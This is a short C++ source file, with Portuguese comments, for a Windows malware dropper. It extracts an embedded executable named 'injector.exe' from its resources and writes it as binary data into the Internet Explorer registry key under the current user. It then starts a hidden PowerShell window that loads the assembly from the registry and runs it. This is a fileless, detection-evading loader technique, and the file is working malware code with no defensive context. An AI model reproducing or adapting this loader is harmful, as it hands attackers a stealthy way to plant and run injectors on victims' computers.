#include <Windows.h>
#include "../Global/NativeRegistry.h"
#include "resource.h"

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Le injector.exe pelos recursos
	HRSRC injectorResource = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_INJECTOR), "EXE");
	if (!injectorResource) return 0;

	DWORD injectorSize = SizeofResource(NULL, injectorResource);
	if (injectorSize == 0) return 0;

	LPBYTE injectorResourceData = (LPBYTE)LockResource(LoadResource(NULL, injectorResource));
	if (!injectorResourceData) return 0;


	// Injeta injector.exe no registro
	HKEY key;
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer", 0, KEY_ALL_ACCESS, &key) != ERROR_SUCCESS) return 0;
	if (RegSetValueExA(key, NULL, 0, REG_BINARY, injectorResourceData, injectorSize) != ERROR_SUCCESS) return 0;

	// Executa o arquivo
	LPCSTR runCommand = "\"[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\\\"Software\\\\Microsoft\\\\Internet Explorer\\\").GetValue($Null)).EntryPoint.Invoke(0,$Null)\"";
	ShellExecuteA(NULL, "open", "powershell", runCommand, NULL, SW_HIDE);

	return 0;
}